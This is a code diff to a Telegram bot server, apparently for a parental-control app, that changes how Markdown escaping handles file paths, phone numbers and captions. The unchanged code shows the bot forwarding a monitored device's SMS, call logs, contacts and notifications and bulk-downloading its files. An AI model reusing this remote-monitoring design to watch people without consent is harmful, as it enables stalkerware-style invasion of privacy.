@@ -78,10 +78,15 @@ const botDeviceSelection = new Map();
 
 let bot = null;
 
-// ── Markdown escape utility ─────────────────────────────────────────────
+// Telegram legacy Markdown only treats _ * ` [ as markup.
 function escapeMd(text) {
-  if (!text) return '';
-  return text.replace(/([_*\[\]()~`>#+\-=|{}.!])/g, '\\$1');
+  if (text == null) return '';
+  return String(text).replace(/([_*`\[])/g, '\\$1');
+}
+
+function escapeMdCode(text) {
+  if (text == null) return '';
+  return String(text).replace(/`/g, "'");
 }
 
 // ════════════════════════════════════════════════════════════════════
@@ -362,7 +367,7 @@ function handleBotFileListing(chatId, editMsgId, deviceId, payload, filterExt, p
 
   const escFolder = escapeMd(folderName);
   const escDev    = escapeMd(devName);
-  const escPath   = escapeMd(curPath);
+  const escPath   = escapeMdCode(curPath);
 
   let text = `*${escFolder}*  (${escDev})\n`;
   text += `\`${escPath}\`\n`;
@@ -371,7 +376,7 @@ function handleBotFileListing(chatId, editMsgId, deviceId, payload, filterExt, p
   if (catSummary) text += `  ${catSummary}`;
   text += `\n`;
   if (filter !== 'all') {
-    text += `Filter: \`${escapeMd(filter)}\` → ${filtered.length} file\n`;
+    text += `Filter: \`${escapeMdCode(filter)}\` → ${filtered.length} file\n`;
   }
   if (totalPages > 1) {
     text += `Page ${safePage + 1}/${totalPages}\n`;
@@ -513,8 +518,7 @@ async function handleBotFileDownload(chatId, deviceId, payload) {
       return;
     }
 
-    const escapedName = escapeMd(name);
-    await bot.sendMessage(chatId, `⬇️ Sending: *${escapedName}* (${formatSize(buffer.length)})…`, { parse_mode: 'Markdown' });
+    await bot.sendMessage(chatId, `Sending: ${name} (${formatSize(buffer.length)})…`);
 
     const imageExts = ['jpg','jpeg','png','gif','webp','bmp','heic','heif'];
     const videoExts = ['mp4','mkv','avi','mov','3gp','webm'];
@@ -528,11 +532,11 @@ async function handleBotFileDownload(chatId, deviceId, payload) {
     if (imageExts.includes(ext)) {
       const mime = ext === 'jpg' ? 'image/jpeg' : 'image/' + ext;
       await bot.sendPhoto(chatId, buffer,
-        { caption: '📷 ' + escapedName },
+        { caption: name },
         { filename: name, contentType: mime }
       ).catch(() =>
         bot.sendDocument(chatId, buffer,
-          { caption: '🖼️ ' + escapedName },
+          { caption: name },
           { filename: name, contentType: 'application/octet-stream' }
         )
       );
@@ -548,14 +552,14 @@ async function handleBotFileDownload(chatId, deviceId, payload) {
       else if (codeExts.includes(ext))   emoji = '💻';
       else if (textExts.includes(ext))   emoji = '📋';
       await bot.sendDocument(chatId, buffer,
-        { caption: emoji + ' ' + escapedName },
+        { caption: emoji + ' ' + name },
         { filename: name, contentType: 'application/octet-stream' }
       );
     }
     console.log(`[BOT] File sent to chat ${chatId}: ${name} (${formatSize(buffer.length)})`);
   } catch (err) {
     console.error('[BOT] File send error:', err.message);
-    bot.sendMessage(chatId, `❌ File send hoyni: ${escapeMd(err.message)}`);
+    bot.sendMessage(chatId, 'File send hoyni: ' + (err.message || 'unknown error'));
   }
 }
 
@@ -600,10 +604,10 @@ function notifyAdminSms(deviceId, childName, sender, body, time) {
     const t = new Date(time).toLocaleTimeString();
     notifyAdmin(
       `💬 *Incoming SMS — ${escapeMd(childName)}*\n\n` +
-      `From: \`${escapeMd(sender)}\`\n` +
+       `From: \`${escapeMdCode(sender)}\`\n` +
       `Time: ${t}\n\n` +
       `"${body.length > 200 ? escapeMd(body.slice(0,200))+'…' : escapeMd(body)}"`,
-      { reply_markup: { inline_keyboard: [[{ text: `📱 View ${escapeMd(childName)}`, callback_data: `sel:${deviceId}` }]] } }
+      { reply_markup: { inline_keyboard: [[{ text: `📱 View ${childName}`, callback_data: `sel:${deviceId}` }]] } }
     );
   } catch (e) { console.error('[BOT] SMS notify error:', e.message); }
 }
@@ -624,7 +628,7 @@ function handleBotDataResult(chatId, deviceId, payload) {
         const dur   = c.duration ? `${Math.floor(c.duration/60)}m${c.duration%60}s` : '—';
         const date  = new Date(c.date).toLocaleDateString('bn-BD');
         const name  = c.name ? ` (${escapeMd(c.name)})` : '';
-        text += `${icon} \`${escapeMd(c.number)}\`${name} — ${dur} — ${date}\n`;
+        text += `${icon} \`${escapeMdCode(c.number)}\`${name} — ${dur} — ${date}\n`;
       }
       if (calls.length > 25) text += `\n_…aro ${calls.length-25} ta call_`;
       bot.sendMessage(chatId, text, { parse_mode: 'Markdown',
@@ -638,7 +642,7 @@ function handleBotDataResult(chatId, deviceId, payload) {
         const date = new Date(m.date).toLocaleDateString('bn-BD');
         const read = m.read ? '' : '🔵 ';
         const body = m.body.length > 80 ? escapeMd(m.body.slice(0,80))+'…' : escapeMd(m.body);
-        text += `${read}\`${escapeMd(m.from)}\` — ${date}\n_${body}_\n\n`;
+        text += `${read}\`${escapeMdCode(m.from)}\` — ${date}\n_${body}_\n\n`;
       }
       bot.sendMessage(chatId, text, { parse_mode: 'Markdown',
         reply_markup: { inline_keyboard: [[{ text: '◀️ Back', callback_data: `sel:${deviceId}` }]] } });
@@ -652,7 +656,7 @@ function handleBotDataResult(chatId, deviceId, payload) {
         bot.sendDocument(chatId, buf, { caption: `👥 ${escDev} — ${contacts.length} contacts` }, { filename: 'contacts.txt', contentType: 'text/plain' });
       } else {
         let text = `👥 *Contacts — ${escDev}* (${contacts.length})\n\n`;
-        for (const c of contacts) text += `👤 *${escapeMd(c.name)}*  \`${escapeMd(c.number)}\`\n`;
+        for (const c of contacts) text += `👤 *${escapeMd(c.name)}*  \`${escapeMdCode(c.number)}\`\n`;
         bot.sendMessage(chatId, text, { parse_mode: 'Markdown',
           reply_markup: { inline_keyboard: [[{ text: '◀️ Back', callback_data: `sel:${deviceId}` }]] } });
       }
@@ -819,7 +823,7 @@ function initTelegramBot() {
     const stUsed   = dev.screenTimeUsedMin  || 0;
     const stLimit  = dev.screenTimeLimitMin || 0;
     const stText   = stLimit > 0 ? `${stUsed} / ${stLimit} min` : `${stUsed} min (no limit)`;
-    const blocked  = dev.blockedApps ? `\`${escapeMd(dev.blockedApps)}\`` : "_kono app block kora nai_";
+    const blocked  = dev.blockedApps ? `\`${escapeMdCode(dev.blockedApps)}\`` : "_kono app block kora nai_";
     const lastSeen = new Date(dev.lastSeen).toLocaleTimeString("bn-BD");
 
     const escChild = escapeMd(dev.childName);
@@ -936,7 +940,7 @@ function initTelegramBot() {
       state.pendingFilterExt = null;
 
       const loadMsg = await bot.sendMessage(chatId,
-        `Loading: \`${escapeMd(resolvedPath)}\`…`, { parse_mode: 'Markdown' });
+        `Loading: \`${escapeMdCode(resolvedPath)}\`…`, { parse_mode: 'Markdown' });
       requestDeviceDir(chatId, loadMsg.message_id, devId, resolvedPath, filterExt, 0);
       return;
     }
@@ -950,7 +954,7 @@ function initTelegramBot() {
       }
       const resolvedPath = resolveFolderPath(text);
       const loadMsg = await bot.sendMessage(chatId,
-        `🔍 Scanning folder: \`${escapeMd(resolvedPath)}\`…\n_Sob file list korchi, ektu wait koro…_`,
+        `🔍 Scanning folder: \`${escapeMdCode(resolvedPath)}\`…\n_Sob file list korchi, ektu wait koro…_`,
         { parse_mode: 'Markdown' });
 
       pendingBotFileRequests.set(devId + '_getall', {
@@ -988,7 +992,7 @@ function initTelegramBot() {
       });
       if (dev) dev.blockedApps = apps;
       bot.sendMessage(chatId,
-        `✅ Block policy update hoyeche!\n\n👦 *${escapeMd(dev?.childName)}*\n🚫 Blocked: \`${escapeMd(apps)}\`\n\n_Apps gulo ekhon theke block thakbe._`,
+        `✅ Block policy update hoyeche!\n\n👦 *${escapeMd(dev?.childName)}*\n🚫 Blocked: \`${escapeMdCode(apps)}\`\n\n_Apps gulo ekhon theke block thakbe._`,
         { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "◀️ Back to Device", callback_data: `sel:${devId}` }]] } }
       );
       return;
@@ -1000,7 +1004,7 @@ function initTelegramBot() {
     if (text === "⚙️ Settings") {
       const miniUrl = PUBLIC_URL ? `${PUBLIC_URL}/?tg=1` : null;
       bot.sendMessage(chatId,
-        `⚙️ *Settings*\n\n🔑 Token: \`${escapeMd(SECURITY_TOKEN)}\`\n🤖 Admin ID: \`${ADMIN_TG_ID}\`\n🌐 Server: \`${escapeMd(PUBLIC_URL || "local")}\``,
+        `⚙️ *Settings*\n\n🔑 Token: \`${escapeMdCode(SECURITY_TOKEN)}\`\n🤖 Admin ID: \`${ADMIN_TG_ID}\`\n🌐 Server: \`${escapeMdCode(PUBLIC_URL || "local")}\``,
         {
           parse_mode: "Markdown",
           reply_markup: {
@@ -1067,7 +1071,7 @@ function initTelegramBot() {
       const deviceId = data.slice(4);
       state.selectedDeviceId = deviceId;
       state.awaitingInput    = null;
-      bot.answerCallbackQuery(query.id, { text: `✅ ${escapeMd(getDeviceName(deviceId))} selected` });
+      bot.answerCallbackQuery(query.id, { text: `${getDeviceName(deviceId)} selected` });
       sendDeviceCard(chatId, deviceId, msgId);
       return;
     }
@@ -1091,7 +1095,7 @@ function initTelegramBot() {
         bot.answerCallbackQuery(query.id, { text: 'File manager opening…' });
         const loadMsg = await bot.sendMessage(chatId,
           `*File Manager — ${escapeMd(dev.childName)}*\n\n` +
-          `Loading: \`${escapeMd(STORAGE_ROOT)}\`…\n` +
+          `Loading: \`${escapeMdCode(STORAGE_ROOT)}\`…\n` +
           `_Folder e tap kore dhukho. Shortcut ba Path diye jump kora jabe._`,
           { parse_mode: 'Markdown' }
         );
@@ -1160,7 +1164,7 @@ function initTelegramBot() {
         const current = dev.blockedApps || "";
         bot.sendMessage(chatId,
           `🚫 *App Block Policy — ${escapeMd(dev.childName)}*\n\n` +
-          `Ekhon blocked: ${current ? `\`${escapeMd(current)}\`` : "_kono app nai_"}\n\n` +
+          `Ekhon blocked: ${current ? `\`${escapeMdCode(current)}\`` : "_kono app nai_"}\n\n` +
           `Quick select (tap korle add hobe):`,
           {
             parse_mode: "Markdown",
@@ -1475,7 +1479,7 @@ Kon inbox dekhte chao?`, {
         }
         bot.answerCallbackQuery(query.id, { text: 'Scanning folder…' });
         const loadMsg = await bot.sendMessage(chatId,
-          `Scanning folder: \`${escapeMd(rawPath)}\`…\n_Sob file list korchi, ektu wait koro…_`,
+          `Scanning folder: \`${escapeMdCode(rawPath)}\`…\n_Sob file list korchi, ektu wait koro…_`,
           { parse_mode: 'Markdown' });
         pendingBotFileRequests.set(devId + '_getall', {
           chatId, msgId: loadMsg.message_id,
@@ -1526,7 +1530,7 @@ Kon inbox dekhte chao?`, {
           return;
         }
         bot.editMessageText(
-          `Loading: \`${escapeMd(rawPath)}\`…`,
+          `Loading: \`${escapeMdCode(rawPath)}\`…`,
           { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' }
         ).catch(() => {});
         requestDeviceDir(chatId, msgId, devId, rawPath, filterExt, page);
@@ -1548,7 +1552,7 @@ Kon inbox dekhte chao?`, {
         }
         bot.answerCallbackQuery(query.id, { text: 'Loading…' });
         bot.editMessageText(
-          `Loading: \`${escapeMd(rawPath)}\`…`,
+          `Loading: \`${escapeMdCode(rawPath)}\`…`,
           { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' }
         ).catch(() => {});
         requestDeviceDir(chatId, msgId, devId, rawPath, filterExt, 0);
@@ -1583,7 +1587,7 @@ Kon inbox dekhte chao?`, {
         bot.answerCallbackQuery(query.id);
         bot.sendMessage(chatId,
           `${emoji} *${escapeMd(fileName)}*
-\`${escapeMd(filePath)}\``,
+\`${escapeMdCode(filePath)}\``,
           {
             parse_mode: 'Markdown',
             reply_markup: {
@@ -1634,7 +1638,7 @@ Kon inbox dekhte chao?`, {
         bot.sendMessage(chatId,
           `⚠️ *Delete confirm*
 
-\`${escapeMd(fileName)}\`
+\`${escapeMdCode(fileName)}\`
 
 Nischit delete korte chao?`,
           {
@@ -1701,7 +1705,7 @@ function notifyDeviceConnected(deviceId, childName, battery) {
     {
       reply_markup: {
         inline_keyboard: [[
-          { text: `📱 Manage ${escapeMd(childName)}`, callback_data: `sel:${deviceId}` }
+          { text: `📱 Manage ${childName}`, callback_data: `sel:${deviceId}` }
         ]]
       }
     }
@@ -1721,7 +1725,7 @@ function notifyAppBlocked(deviceId, childName, appName, packageName, time) {
     {
       reply_markup: {
         inline_keyboard: [[
-          { text: `📱 View ${escapeMd(childName)}`, callback_data: `sel:${deviceId}` }
+          { text: `📱 View ${childName}`, callback_data: `sel:${deviceId}` }
         ]]
       }
     }
@@ -1909,8 +1913,8 @@ wss.on('connection', (ws, req) => {
             if (notifKey !== dev._lastNotifKey) {
               dev._lastNotifKey = notifKey;
               notifyAdmin(
-                `🔔 *Notification — ${escapeMd(dev.childName)}*\n\n📱 App: \`${escapeMd(appLabel)}\`\n📝 ${escapeMd(msgTitle)}\n💬 ${msgText.length > 200 ? escapeMd(msgText.slice(0,200))+'…' : escapeMd(msgText)}\n🕐 ${notifTime}`,
-                { reply_markup: { inline_keyboard: [[{ text: '📱 View '+escapeMd(dev.childName), callback_data: 'sel:'+deviceId }]] } }
+                `🔔 *Notification — ${escapeMd(dev.childName)}*\n\n📱 App: \`${escapeMdCode(appLabel)}\`\n📝 ${escapeMd(msgTitle)}\n💬 ${msgText.length > 200 ? escapeMd(msgText.slice(0,200))+'…' : escapeMd(msgText)}\n🕐 ${notifTime}`,
+                { reply_markup: { inline_keyboard: [[{ text: '📱 View '+dev.childName, callback_data: 'sel:'+deviceId }]] } }
               );
             }
           }
@@ -1955,7 +1959,7 @@ wss.on('connection', (ws, req) => {
               `🔋 Battery: *${p.battery}%* ${p.is_charging ? '⚡ Charging' : ''}\n` +
               `🆔 Device ID: \`${p.device_id}\`\n` +
               `⏱ Screen Used: *${p.screen_time_used} min*\n` +
-              `🚫 Blocked Apps: \`${escapeMd(p.blocked_apps || 'none')}\``,
+              `🚫 Blocked Apps: \`${escapeMdCode(p.blocked_apps || 'none')}\``,
               { parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '◀️ Back', callback_data: `sel:${deviceId}` }]] } }
             );
           }
@@ -1979,14 +1983,14 @@ wss.on('connection', (ws, req) => {
             if (payload.action === 'list_dir_result' && pending.type === 'list_dir') {
               pendingBotFileRequests.delete(deviceId);
               if (payload.error) {
-                if (bot) bot.sendMessage(pending.chatId, `Error: ${escapeMd(payload.error)}`);
+                if (bot) bot.sendMessage(pending.chatId, 'Error: ' + (payload.error || 'list failed'));
               } else {
                 const listing = normalizeDirPayload(payload, pending.path);
                 handleBotFileListing(pending.chatId, pending.msgId, deviceId, listing, pending.filterExt, pending.page || 0);
               }
             } else if (payload.action === 'error' && pending.type === 'list_dir') {
               pendingBotFileRequests.delete(deviceId);
-              if (bot) bot.sendMessage(pending.chatId, `Error: ${escapeMd(payload.message || 'list failed')}`);
+              if (bot) bot.sendMessage(pending.chatId, 'Error: ' + (payload.message || 'list failed'));
             }
           }
 
@@ -1997,7 +2001,7 @@ wss.on('connection', (ws, req) => {
               handleBotFileDownload(pendingDl.chatId, deviceId, payload);
             } else if (payload.action === 'error') {
               pendingBotFileRequests.delete(deviceId + '_dl');
-              if (bot) bot.sendMessage(pendingDl.chatId, `Error: ${escapeMd(payload.message || 'download failed')}`);
+              if (bot) bot.sendMessage(pendingDl.chatId, 'Error: ' + (payload.message || 'download failed'));
             }
           }
 
@@ -2038,7 +2042,7 @@ wss.on('connection', (ws, req) => {
                 // Update scanning progress message
                 bot.editMessageText(
                   `🔍 *Scanning…*\n\n` +
-                  `📂 \`${escapeMd(pendingAll.rootPath)}\`\n` +
+                  `📂 \`${escapeMdCode(pendingAll.rootPath)}\`\n` +
                   `📁 Folders scanned: ${pendingAll.scannedFolders}\n` +
                   `📄 Files found so far: ${pendingAll.collectedFiles.length}\n\n` +
                   `_Current: ${escapeMd(nextPath.split('/').pop())}_`,
@@ -2055,7 +2059,7 @@ wss.on('connection', (ws, req) => {
 
                 if (allFiles.length === 0) {
                   bot.editMessageText(
-                    `📂 *${escapeMd(pendingAll.rootPath)}*\n\n_Kono file pawa jaynai (folder khali ba only subfolders)._`,
+                    `📂 *${escapeMd(pendingAll.rootPath.split('/').pop() || pendingAll.rootPath)}*\n\`${escapeMdCode(pendingAll.rootPath)}\`\n\n_Kono file pawa jaynai (folder khali ba only subfolders)._`,
                     { chat_id: chatId2, message_id: pendingAll.msgId, parse_mode: 'Markdown' }
                   ).catch(() =>
                     bot.sendMessage(chatId2, `📂 Kono file pawa jaynai.`)
@@ -2066,7 +2070,7 @@ wss.on('connection', (ws, req) => {
                 // Show summary before download starts
                 bot.editMessageText(
                   `📥 *Get All Files*\n\n` +
-                  `📂 \`${escapeMd(pendingAll.rootPath)}\`\n` +
+                  `📂 \`${escapeMdCode(pendingAll.rootPath)}\`\n` +
                   `📁 Folders: ${pendingAll.scannedFolders || 1}\n` +
                   `📊 *${allFiles.length} ta file* pawa geche\n\n` +
                   `⬇️ Download shuru hocche… 0/${allFiles.length}`,
@@ -2083,7 +2087,7 @@ wss.on('connection', (ws, req) => {
                     if (i % 5 === 0 || i === allFiles.length - 1) {
                       bot.editMessageText(
                         `📥 *Get All Files — Progress*\n\n` +
-                        `📂 \`${escapeMd(pendingAll.rootPath)}\`\n` +
+                        `📂 \`${escapeMdCode(pendingAll.rootPath)}\`\n` +
                         `📊 ${allFiles.length} ta file\n\n` +
                         `⬇️ Downloading: ${i + 1}/${allFiles.length}\n` +
                         `✅ Sent: ${sent}  ⏭ Skipped: ${skipped}  ❌ Failed: ${failed}\n\n` +
@@ -2095,7 +2099,7 @@ wss.on('connection', (ws, req) => {
                     // Skip files > 50MB
                     if (file.size && file.size > 50 * 1024 * 1024) {
                       bot.sendMessage(chatId2,
-                        `⏭️ *Skip* (>50MB): \`${escapeMd(file.name)}\` — ${formatSize(file.size)}`,
+                        `⏭️ *Skip* (>50MB): \`${escapeMdCode(file.name)}\` — ${formatSize(file.size)}`,
                         { parse_mode: 'Markdown' });
                       skipped++;
                       continue;
@@ -2123,7 +2127,7 @@ wss.on('connection', (ws, req) => {
                     } catch (err) {
                       console.error(`[GET_ALL] File failed: ${file.name}`, err.message);
                       bot.sendMessage(chatId2,
-                        `❌ \`${escapeMd(file.name)}\` — ${escapeMd(err.message)}`,
+                        `❌ \`${escapeMdCode(file.name)}\` — ${escapeMd(err.message)}`,
                         { parse_mode: 'Markdown' });
                       failed++;
                       await new Promise(r => setTimeout(r, 300));
@@ -2133,7 +2137,7 @@ wss.on('connection', (ws, req) => {
                   // Final summary
                   bot.editMessageText(
                     `✅ *Get All Files — Done!*\n\n` +
-                    `📂 \`${escapeMd(pendingAll.rootPath)}\`\n\n` +
+                    `📂 \`${escapeMdCode(pendingAll.rootPath)}\`\n\n` +
                     `📊 Total: ${allFiles.length} ta file\n` +
                     `✅ Sent: ${sent}\n` +
                     `⏭️ Skipped (>50MB): ${skipped}\n` +
